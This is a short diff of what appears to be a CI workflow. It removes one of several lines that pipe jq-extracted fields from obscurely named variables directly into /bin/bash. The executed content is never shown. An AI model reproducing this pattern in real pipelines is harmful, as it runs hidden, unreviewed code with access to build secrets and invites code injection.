@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$jkr68148" | jq -r .cpudz84910 | /bin/bash
           echo $megg71759 | jq -r .ix895 | /bin/bash
-          echo $ci3248 | jq -r .sattm705 | /bin/bash
           printf '%s' "$qarv6" | jq -r .zbssr73 | /bin/bash
 
       - name: Save output
